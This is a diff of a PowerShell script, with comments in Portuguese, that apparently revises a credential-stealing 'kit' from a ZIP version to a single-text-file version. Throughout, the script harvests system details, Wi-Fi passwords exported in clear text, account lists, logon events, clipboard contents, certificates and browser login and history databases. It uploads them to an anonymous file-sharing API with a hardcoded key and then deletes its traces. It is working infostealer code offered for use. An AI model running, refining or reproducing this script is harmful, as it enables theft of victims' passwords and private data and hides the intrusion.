@@ -1,86 +1,77 @@
-# KIT v4.1 – ZIP único, confere conteúdo, sem compressão, AnonFilesNew 20 GB
-$kit="$env:TEMP\k"; ni -ItemType Directory $kit -Force |Out-Null
+# KIT v5 – TXT único, sem ZIP, sem corromper
+$kit = "$env:TEMP\k"
+ni -ItemType Directory $kit -Force | Out-Null
+$out = "$kit\full.txt"          # único arquivo de saída
 
-# 1) TXT leves
-systeminfo |Out-File $kit\sys.txt -Encoding UTF8
-Get-CimInstance Win32_ComputerSystem |Out-File $kit\hw.txt -Encoding UTF8
-Get-CimInstance Win32_Processor |Out-File $kit\hw.txt -Append -Encoding UTF8
-Get-CimInstance Win32_BIOS |Out-File $kit\hw.txt -Append -Encoding UTF8
-Get-NetIPConfiguration |Out-File $kit\net.txt -Encoding UTF8
-netsh wlan export profile key=clear folder=$kit |Out-Null
-Get-CimInstance Win32_UserAccount |Out-File $kit\usr.txt -Encoding UTF8
-net localgroup administradores |Out-File $kit\adm.txt -Encoding UTF8
-Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624} -Max 100 -EA 0|Select TimeCreated,Message |Out-File $kit\log.txt -Encoding UTF8
-Get-Clipboard |Out-File $kit\clip.txt -Encoding UTF8
-Get-ChildItem $env:APPDATA\Microsoft\Windows\Recent -Name |Out-File $kit\rec.txt -Encoding UTF8
-
-# 2) Navegadores
-@('Login Data','History','logins.json')| %{
-  Get-ChildItem $env:LOCALAPPDATA,$env:APPDATA -Recurse -File -Filter $_ -EA 0|Select -First 1| %{
-    if(Test-Path $_.FullName){Copy-Item $_.FullName "$kit\$($_.Name)" -EA 0}
-  }
+# ---------- 1) FUNÇÃO AUXILIAR ----------
+function Add-Kit {
+    param($Title, $ScriptBlock)
+    "----- INÍCIO $Title -----" | Out-File $out -Append -Encoding UTF8
+    Invoke-Command -ScriptBlock $ScriptBlock | Out-File $out -Append -Encoding UTF8
+    "----- FIM $Title -----`r`n" | Out-File $out -Append -Encoding UTF8
 }
 
-# 3) Certificados
-Get-ChildItem Cert:\CurrentUser\My|Select Subject,Thumbprint,NotAfter |Out-File $kit\certs.txt -Encoding UTF8
-
-
-# ---- descarrega todos os handles ----
-$shell   = $null
-$zipFile = $null
-[GC]::Collect()
-[GC]::WaitForPendingFinalizers()
-
-
-# 4) ZIP sem compressão – garantido
-$zip = "$env:TEMP\k.zip"
-if(Test-Path $zip){Remove-Item $zip -Force}
-
-# ---- força flush em tudo que ainda possa estar em memória ----
-[GC]::Collect()
-[GC]::WaitForPendingFinalizers()
-
-# ---- cria o arquivo ZIP vazio antes de abrir com Shell ----
-Set-Content -Path $zip -Value ([byte[]]@()) -Encoding Byte -NoNewline
-
-$shell   = New-Object -ComObject Shell.Application
-$zipFile = $shell.NameSpace($zip)
-
-# ---- copia item a item, aguardando cada um terminar ----
-Get-ChildItem $kit | ForEach-Object {
-    $zipFile.CopyHere($_.FullName, 4 + 16)   # 4 = não exibir progresso, 16 = responder "Sim para Todos"
-    # aguarda o shell registrar a inclusão
-    do { Start-Sleep -m 200 } while (
-        $zipFile.Items().Count -lt (Get-ChildItem $zip).Count
-    )
+# ---------- 2) COLETA ----------
+Add-Kit 'SYSTEMINFO'   { systeminfo }
+Add-Kit 'HARDWARE'     {
+    Get-CimInstance Win32_ComputerSystem
+    Get-CimInstance Win32_Processor
+    Get-CimInstance Win32_BIOS
+}
+Add-Kit 'REDE'         { Get-NetIPConfiguration }
+Add-Kit 'WLAN' {
+    netsh wlan export profile key=clear folder=$kit | Out-Null
+    Get-ChildItem $kit -Filter '*.xml' | %{ Get-Content $_.FullName -Raw }
+}
+Add-Kit 'USUÁRIOS'     { Get-CimInstance Win32_UserAccount }
+Add-Kit 'ADMINISTRADORES' { net localgroup administradores }
+Add-Kit 'LOGON' {
+    Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624} -Max 100 -EA 0 |
+        Select TimeCreated, Message
+}
+Add-Kit 'CLIPBOARD'    { Get-Clipboard }
+Add-Kit 'ARQUIVOS-RECENTES' {
+    Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -Name -EA 0
+}
+Add-Kit 'CERTIFICADOS' {
+    Get-ChildItem Cert:\CurrentUser\My |
+        Select Subject, Thumbprint, NotAfter
 }
 
-# ---- validação final ----
-if((Get-ChildItem $kit).Count -ne $zipFile.Items().Count){
-    Write-Host "ERRO: arquivos faltando no ZIP" -Fore Red; exit
+# ---------- 3) NAVEGADORES (base64 para não quebrar encoding) ----------
+@('Login Data','History','logins.json') | %{
+    Get-ChildItem $env:LOCALAPPDATA,$env:APPDATA -Recurse -File -Filter $_ -EA 0 |
+        Select -First 1 | %{
+            if(Test-Path $_.FullName){
+                $b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($_.FullName))
+                "----- INÍCIO NAVEGADOR $($_.Name) -----" | Out-File $out -Append -Encoding UTF8
+                $b64 | Out-File $out -Append -Encoding UTF8
+                "----- FIM NAVEGADOR $($_.Name) -----`r`n" | Out-File $out -Append -Encoding UTF8
+            }
+        }
 }
 
+# ---------- 4) UPLOAD ----------
+$file = Get-Item $out
+$key  = "AFtru5qQZX8HN5npouThcNDJtVbe6d"
+$uri  = "https://api.anonfilesnew.com/upload?key=$key&pretty=true"
 
-# 5) Upload
-$file=Get-Item $zip
-$key="AFtru5qQZX8HN5npouThcNDJtVbe6d"
-$uri="https://api.anonfilesnew.com/upload?key=$key&pretty=true"
 try{
-  $boundary=[System.Guid]::NewGuid().ToString()
-  $lf="`r`n"
-  $body=(
-    "--$boundary$lf"+
-    "Content-Disposition: form-data; name=`"file`"; filename=`"$($file.Name)`"$lf"+
-    "Content-Type: application/octet-stream$lf$lf"+
-    [System.IO.File]::ReadAllBytes($file.FullName)+
-    "$lf--$boundary--$lf"
-  )
-  $bytes=[System.Text.Encoding]::UTF8.GetBytes($body)
-  $resp=Invoke-RestMethod -Uri $uri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bytes
-  $resp.data.file.url.full
+    $boundary = [System.Guid]::NewGuid().ToString()
+    $lf = "`r`n"
+    $body = (
+        "--$boundary$lf" +
+        "Content-Disposition: form-data; name=`"file`"; filename=`"$($file.Name)`"$lf" +
+        "Content-Type: application/octet-stream$lf$lf" +
+        [System.IO.File]::ReadAllBytes($file.FullName) +
+        "$lf--$boundary--$lf"
+    )
+    $bytes = [System.Text.Encoding]::UTF8.GetBytes($body)
+    $resp  = Invoke-RestMethod -Uri $uri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bytes
+    $resp.data.file.url.full
 }catch{
-  Write-Host "ERRO no upload: $($_.Exception.Message)" -Fore Red
+    Write-Host "ERRO no upload: $($_.Exception.Message)" -Fore Red
 }
 
-# 6) Limpa
-Remove-Item $kit -Recurse -Force; Remove-Item $zip -Force
+# ---------- 5) LIMPEZA ----------
+Remove-Item $kit -Recurse -Force
